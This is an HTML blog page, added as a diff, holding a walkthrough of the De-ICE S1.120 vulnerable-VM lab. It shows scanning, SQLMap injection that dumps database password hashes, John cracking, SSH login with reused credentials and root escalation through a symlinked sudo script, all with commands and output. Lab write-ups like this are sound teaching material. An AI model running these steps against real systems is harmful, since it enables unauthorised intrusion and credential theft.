@@ -1,0 +1,184 @@
+<!DOCTYPE html>
+<html lang="en-us">
+<head>
+<meta charset="utf-8">
+<meta name="description" content="">
+<meta name="keywords" content="">
+<meta name="author" content="">
+<meta name="generator" content="Hugo 0.15" />
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<link rel="stylesheet" href="http://rastamouse.me/css/style.css" type="text/css">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Source+Code+Pro:400,700" type="text/css">
+<link rel="alternate" href="http://rastamouse.me/index.xml" type="application/rss+xml" title="rastamouse.me">
+<title>De-ICE S1.120 - rastamouse.me</title>
+</head>
+<body>
+
+<header>
+  <div class="container">
+    <a class="path" href="http://rastamouse.me/">[rastamouse.me]</a>
+    <span class="caret"># _</span>
+  </div>
+</header>
+
+<div class="container">
+
+
+<main role="main" class="article">
+  
+<article class="single" itemscope itemtype="http://schema.org/BlogPosting">
+  <div class="meta">
+
+    <span class="key">published on</span>
+    <span class="val"><time itemprop="datePublished" datetime="2013-01-18">January 18, 2013</time></span>
+
+
+    <span class="key">in</span>
+    <span class="val">
+
+        <a href="http://rastamouse.me/categories/writeup">writeup</a>
+
+    </span>
+
+
+    <br>
+    <span class="key">tags:</span>
+    <span class="val">
+
+        <a href="http://rastamouse.me/tags/de-ice">de-ice</a>
+
+    </span>
+
+  </div>
+  <h1 class="headline" itemprop="headline">De-ICE S1.120</h1>
+  <section class="body" itemprop="articleBody">
+    
+
+<p>This is a walkthrough of how I completed the De-ICE S1.230 challenge.  The goal is to access various internal documents.</p>
+
+<h2 id="nmap:1a817b9b9b67bfd1b15cedf6dcbe70ff">Nmap</h2>
+
+<pre><code class="language-text">root@kali:~/de-ice/1.120# nmap -n -sV -A -p- 192.168.1.120
+
+PORT     STATE SERVICE  VERSION
+21/tcp   open  ftp      ProFTPD 1.3.2
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+|_dr-xr-xr-x   2 0        0              40 Jan  2  2011 incoming
+22/tcp   open  ssh      OpenSSH 5.1 (protocol 2.0)
+| ssh-hostkey:
+|   1024 f0:90:25:9a:9e:cd:bd:31:ec:e9:f4:11:47:2f:69:a4 (DSA)
+|_  2048 06:32:d9:26:9a:53:f0:78:9c:43:fd:9c:50:26:d0:64 (RSA)
+80/tcp   open  http     Apache httpd 2.2.11 ((Unix) DAV/2 mod_ssl/2.2.11 OpenSSL/0.9.8k PHP/5.2.9 mod_apreq2-20051231/2.6.0 mod_perl/2.0.4 Perl/v5.10.0)
+|_http-methods: No Allow or Public header in OPTIONS response (status code 200)
+|_http-title: Primaline :: Quality Kitchen Accessories
+443/tcp  open  ssl/http Apache httpd 2.2.11 ((Unix) DAV/2 mod_ssl/2.2.11 OpenSSL/0.9.8k PHP/5.2.9 mod_apreq2-20051231/2.6.0 mod_perl/2.0.4 Perl/v5.10.0)
+|_http-methods: No Allow or Public header in OPTIONS response (status code 200)
+|_http-title: Primaline :: Quality Kitchen Accessories
+| ssl-cert: Subject: commonName=localhost/organizationName=Apache Friends/stateOrProvinceName=Berlin/countryName=DE
+| Not valid before: 2004-10-01T08:10:30+00:00
+|_Not valid after:  2010-09-30T08:10:30+00:00
+|_ssl-date: 2014-04-23T11:50:09+00:00; -2s from local time.
+| sslv2:
+|   SSLv2 supported
+|   ciphers:
+|     SSL2_DES_192_EDE3_CBC_WITH_MD5
+|     SSL2_IDEA_128_CBC_WITH_MD5
+|     SSL2_RC2_CBC_128_CBC_WITH_MD5
+|     SSL2_RC4_128_WITH_MD5
+|     SSL2_DES_64_CBC_WITH_MD5
+|     SSL2_RC2_CBC_128_CBC_WITH_MD5
+|_    SSL2_RC4_128_EXPORT40_WITH_MD5
+3306/tcp open  mysql    MySQL (unauthorized)
+</code></pre>
+
+<h2 id="sql-injection:1a817b9b9b67bfd1b15cedf6dcbe70ff">SQL Injection</h2>
+
+<p>Visiting the apache service in a browser takes you to a Data Entry site.</p>
+
+<p>{% img {{ root_url }} /images/write-ups/de-ice-1-120/primaline.jpg %}</p>
+
+<p>Clicking on the View Products link takes you to another page, where you can select products from a drop-down list.  There are no items in there by default, but clicking on the Submit button alters the URL to:</p>
+
+<p><code>http://192.168.1.120/products.php?id=NULL</code></p>
+
+<p>I did some manual tests, but they did not produce any visible SQL error messages.  Though I put the URL into SQLMap to run some more extensive tests.  SQLMap reported an SQL Union vulnerability.</p>
+
+<pre><code class="language-text">root@kali:~/de-ice/1.120# sqlmap -u http://192.168.1.120/products.php?id=NULL
+GET parameter 'id' is 'MySQL UNION query (NULL) - 1 to 10 columns' injectable
+</code></pre>
+
+<pre><code class="language-text">root@kali:~/de-ice/1.120# sqlmap -u http://192.168.1.120/products.php?id=NULL --current-user --current-db --is-dba
+web application technology: Apache 2.2.11, PHP 5.2.9
+back-end DBMS: MySQL 5
+current user:    'webapp@localhost'
+current database:    'merch'
+current user is DBA:    True
+</code></pre>
+
+<p>I next used SQLMap to extract DBMS usernames and passwords, which gave me a rather long list.</p>
+
+<pre><code class="language-text">root@kali:~/de-ice/1.120# sqlmap -u http://192.168.1.120/products.php?id=NULL --users --passwords
+fetching database users password hashes
+do you want to store hashes to a temporary file for eventual further processing with other tools [y/N] y
+writing hashes to a temporary file '/tmp/sqlmaphashes-BMaKet.txt'
+do you want to perform a dictionary-based attack against retrieved password hashes? [Y/n/q] n
+</code></pre>
+
+<p>Instead of cracking these in SQLMap, I saved the hashes to a text file and used John.  A large number of these hashes were cracked immediately.</p>
+
+<p><code>root@kali:~/de-ice/1.120# john /tmp/sqlmaphashes-BMaKet.txt</code></p>
+
+<h2 id="ssh:1a817b9b9b67bfd1b15cedf6dcbe70ff">SSH</h2>
+
+<p>My next step was to try and use these DMBS usernames and passwords to login via SSH.  I noticed my old buddy bbanter on the this, so I tried those credentials first.  Luckily, the passwords were the same and I was granted a shell.</p>
+
+<pre><code class="language-text">root@kali:~/de-ice/1.120# ssh bbanter@192.168.1.120
+Linux 2.6.27.27.
+bbanter@slax:~$
+</code></pre>
+
+<p>A little bit of user enumeration (<code>/etc/passwd</code> &amp; <code>/etc/group</code>) showed that no users were in a wheel or sudo group, but there was a group called admin which ccoffee was a member of.  I checked back with john and found that I had cracked his password too, so I used su to switch.</p>
+
+<p>I checked ccoffee&rsquo;s user area and sudo rights.</p>
+
+<pre><code class="language-text">ccoffee@slax:~$ ls -laR
+drwx------  2 ccoffee users   80 Apr 23 12:19 scripts/
+./scripts:
+-rws--x--x 1 root    admin 110 Apr 23 11:44 getlogs.sh*
+ccoffee@slax:~$ sudo -l
+User ccoffee may run the following commands on this host:
+    (root) NOPASSWD: /home/ccoffee/scripts/getlogs.sh
+</code></pre>
+
+<p>The script here has weak permissions, and allowed ccoffee to elevate himself to root.</p>
+
+<pre><code class="language-text">ccoffee@slax:~$ mv scripts/getlogs.sh scripts/getlogs.sh.bkup
+ccoffee@slax:~$ ln -s /bin/bash scripts/getlogs.sh
+ccoffee@slax:~$ sudo scripts/getlogs.sh
+root@slax:~# id
+uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),17(audio),18(video),19(cdrom),26(tape),83(plugdev)
+</code></pre>
+
+<h2 id="flag:1a817b9b9b67bfd1b15cedf6dcbe70ff">Flag</h2>
+
+<p>There is no specific flag for this challenge - the ability to browse through and read the various documents in the user directories indicates this challenge is complete.</p>
+
+<p><code>root@slax:~# ls -laR /home/</code></p>
+
+  </section>
+</article>
+
+</main>
+
+
+</div>
+
+<footer>
+  <div class="container">
+    <span class="copyright">&copy; 2013  rastamouse.me - <a rel="license" href="http://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a></span>
+  </div>
+</footer>
+
+</body>
+</html>
+
